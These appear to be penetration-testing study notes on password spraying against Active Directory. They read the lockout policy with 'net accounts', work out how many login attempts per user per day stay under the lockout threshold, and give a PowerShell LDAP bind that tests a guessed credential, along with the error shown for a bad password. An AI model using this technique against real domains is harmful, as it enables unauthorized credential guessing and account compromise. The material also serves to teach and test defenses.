## Raw Format for Authentication
```
PS C:\> net accounts
Force user logoff how long after time expires?: Never
Minimum password age (days):                    0
Maximum password age (days):                    42
Minimum password length:                        0
Length of password history maintained:          None
Lockout threshold:                              5
Lockout duration (minutes):                     30
Lockout observation window (minutes):           30
Computer role:                                  WORKSTATION
The command completed successfully
```
- *With these settings, and assuming the actual users don’t fail a login attempt,*  
	we could attempt fifty-two logins in a twenty-four-hour period against every domain user without triggering a lockout.
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "Admin", "P@ssw0rd!")
```
### Error on bad password
```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect.
```